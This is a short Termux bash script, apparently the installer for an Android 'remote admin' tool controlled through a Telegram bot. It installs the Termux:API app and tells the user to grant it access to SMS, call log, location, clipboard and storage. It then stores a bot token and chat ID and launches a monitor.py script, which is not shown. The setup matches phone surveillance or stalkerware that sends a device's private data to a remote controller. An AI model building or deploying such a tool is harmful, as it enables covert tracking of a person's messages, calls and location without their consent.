#!/data/data/com.termux/files/usr/bin/bash

echo "=========================================="
echo "   PRIVATE REMOTE ADMIN SETUP (EC0 MODE)"
echo "=========================================="
pkg update -y && pkg upgrade -y
pkg install python git curl wget termux-api -y
pip install pyTelegramBotAPI requests

# Termux:API App Download & Install
echo "[*] Checking for Termux:API APK..."
if [ ! -f "termux-api.apk" ]; then
    curl -L -o termux-api.apk "https://github.com/termux/termux-api/releases/download/v0.50.1/termux-api_v0.50.1+github-debug_universal.apk"
fi
termux-open termux-api.apk
echo "!!!!! IMPORTANT !!!!!"
echo "1. Install the Termux:API app."
echo "2. Go to Settings > Apps > Termux:API > Permissions"
echo "3. ALLOW: Storage, SMS, Call Log, Location, Clipboard."
echo "4. Wapas Termux mein aake Enter dabayein."
read -p "Press Enter when permissions granted..."

# Taking Inputs
echo "=========================================="
read -p "Enter your Telegram Bot Token: " BOT_TOKEN
read -p "Enter your Telegram Chat ID (Sirf aapka): " CHAT_ID
read -p "Enter the Start Command (e.g., /start): " START_CMD

# Saving to config file
cat > config.json <<EOF
{"bot_token": "$BOT_TOKEN", "chat_id": "$CHAT_ID", "start_cmd": "$START_CMD"}
EOF

echo "[*] Config Saved! Starting the Bot..."
python monitor.py
